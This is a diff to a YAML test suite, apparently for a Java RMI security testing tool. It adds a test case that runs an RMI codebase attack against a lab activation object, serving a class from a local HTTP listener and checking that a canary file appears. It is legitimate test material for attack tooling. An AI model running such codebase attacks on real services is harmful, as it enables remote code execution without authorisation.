@@ -21,6 +21,7 @@ plugins:
         - '../../utils/${codebase-class}2.java'
         - '../../utils/${codebase-class}3.java'
         - '../../utils/${codebase-class}4.java'
+        - '../../utils/${codebase-class}5.java'
 
   - http_listener:
       port: 8000
@@ -163,6 +164,36 @@ tests:
           cleanup: True
           files:
             - '${volume}/${codebase-class}4.txt'
+
+
+  - title: Method Codebase Call (Activatable)
+    description: |-
+      'Performs a codebase attack on the activation-test remote object.'
+      'The expected result is a file being created within the docker'
+      'volume.'
+
+    command:
+      - rmg
+      - codebase
+      - ${TARGET-ACT}
+      - '${codebase-class}5'
+      - 'http://${DOCKER-GW}:8000/'
+      - --signature
+      - 'void updatePreferences(java.util.ArrayList preferences)'
+      - --bound-name
+      - activation-test2
+      - ${OPTIONS}
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - 'load canary class'
+            - 'attack probably worked'
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${codebase-class}5.txt'
 
 
   - title: Missing Signature
